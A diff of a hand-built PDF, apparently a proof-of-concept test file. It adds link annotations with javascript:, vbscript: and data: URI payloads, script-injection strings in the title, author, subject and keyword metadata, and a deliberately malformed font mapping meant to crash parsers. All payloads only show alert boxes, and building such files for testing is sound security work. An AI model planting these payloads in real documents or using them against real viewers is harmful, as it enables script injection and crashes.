@@ -1,4 +1,6 @@
 %PDF-1.4
+%âãÏÓ
+
 1 0 obj
 <<
   /Type /Catalog
@@ -20,6 +22,8 @@ endobj
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
+  /Annots [5 0 R 6 0 R 9 0 R]
+  /Resources << /Font << /F1 8 0 R >> >>
 >>
 endobj
 
@@ -29,32 +33,149 @@ stream
 BT
 /F1 24 Tf
 100 700 Td
-(XSS Test PDF) Tj
+(XSS Font Crash PoC) Tj
 ET
 endstream
 endobj
 
 5 0 obj
 <<
-  /Title (<img src=x onerror=alert(1337)>)
-  /Producer (ExploitPDF)
+  /Type /Annot
+  /Subtype /Link
+  /Rect [100 600 200 620]
+  /Border [0 0 0]
+  /A <<
+    /S /URI
+    /URI (javascript:alert('jsXSS'))
+  >>
+>>
+endobj
+
+6 0 obj
+<<
+  /Type /Annot
+  /Subtype /Link
+  /Rect [100 550 200 570]
+  /Border [0 0 0]
+  /A <<
+    /S /URI
+    /URI (vbscript:msgbox("vbscriptXSS"))
+  >>
+>>
+endobj
+
+7 0 obj
+<< /Length 100 >>
+stream
+/CIDInit /ProcSet findresource begin
+12 dict begin
+begincmap
+/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
+/CMapName /Adobe-Identity-UCS def
+/CMapType 2 def
+1 begincodespacerange
+<00> <ff>
+endcodespacerange
+100 beginbfchar
+<00> <0041>
+<01> <0042>
+<02> <0043>
+% Fuzzing garbage below:
+<03> <ZZZZ>
+<04> <GGGG>
+<05> <0000>
+endbfchar
+endcmap
+CMapName currentdict /CMap defineresource pop
+end
+end
+endstream
+endobj
+
+8 0 obj
+<<
+  /Type /Font
+  /Subtype /Type0
+  /BaseFont /Helvetica
+  /Encoding /Identity-H
+  /DescendantFonts [10 0 R]
+  /ToUnicode 7 0 R
+>>
+endobj
+
+9 0 obj
+<<
+  /Type /Annot
+  /Subtype /Link
+  /Rect [100 500 200 520]
+  /Border [0 0 0]
+  /A <<
+    /S /URI
+    /URI (data:text/html,<svg/onload=alert(999)>)
+  >>
+>>
+endobj
+
+10 0 obj
+<<
+  /Type /Font
+  /Subtype /CIDFontType2
+  /BaseFont /Helvetica
+  /CIDSystemInfo <<
+    /Registry (Adobe)
+    /Ordering (Identity)
+    /Supplement 0
+  >>
+  /FontDescriptor 11 0 R
+  /W [0 [600]]
+>>
+endobj
+
+11 0 obj
+<<
+  /Type /FontDescriptor
+  /FontName /Helvetica
+  /Flags 32
+  /FontBBox [0 0 0 0]
+  /ItalicAngle 0
+  /Ascent 0
+  /Descent 0
+  /CapHeight 0
+  /StemV 0
+>>
+endobj
+
+12 0 obj
+<<
+  /Title (<img src=x onerror=alert(`metaXSS`)>)
+  /Author (<svg/onload=alert(1)>)
+  /Subject (<script>alert("subjectXSS")</script>)
+  /Keywords ("xss"><script>alert('kw')</script>)
+  /Producer (Crash+XSS)
 >>
 endobj
 
 xref
-0 6
+0 13
 0000000000 65535 f 
 0000000010 00000 n 
-0000000063 00000 n 
-0000000128 00000 n 
-0000000224 00000 n 
-0000000337 00000 n 
+0000000076 00000 n 
+0000000136 00000 n 
+0000000264 00000 n 
+0000000371 00000 n 
+0000000488 00000 n 
+0000000604 00000 n 
+0000000852 00000 n 
+0000001020 00000 n 
+0000001145 00000 n 
+0000001286 00000 n 
+0000001386 00000 n 
 trailer
 <<
-  /Size 6
+  /Size 13
   /Root 1 0 R
-  /Info 5 0 R
+  /Info 12 0 R
 >>
 startxref
-421
+1490
 %%EOF
